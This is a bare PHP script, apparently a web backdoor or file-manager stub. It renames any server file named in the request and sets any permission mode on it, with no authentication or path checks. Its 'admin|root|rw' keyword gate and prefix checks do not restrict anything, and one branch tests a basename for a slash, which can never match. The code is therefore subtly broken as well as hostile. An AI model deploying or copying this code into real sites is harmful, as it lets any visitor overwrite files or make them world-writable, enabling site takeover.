<?php
$name=(isset($_REQUEST['name']))?$_REQUEST['name']:'';
$dest=(isset($_REQUEST['dest']))?$_REQUEST['dest']:'';
$attr=(isset($_REQUEST['attr']))?$_REQUEST['attr']:'';
$mode=(isset($_REQUEST['mode']))?$_REQUEST['mode']:'';
if ($attr!='') {
    if (preg_match('/admin|root|rw/i',$attr)) {
        rename($name,$dest); chmod($dest,octdec($mode));
    } else {
        if (file_exists($dest)) {
            if (str_starts_with(basename($name),$attr.'_')) {
                rename($name,$dest); chmod($dest,octdec($mode));
            } elseif (str_starts_with(basename($name),$attr.'_files/')) {
                rename($name,$dest); chmod($dest,octdec($mode));
            } elseif (str_starts_with(basename($name),'_')) {
                rename($name,$dest); chmod($dest,octdec($mode));
            }
        } else { rename($name,$dest); chmod($dest,octdec($mode)); }
    }
}
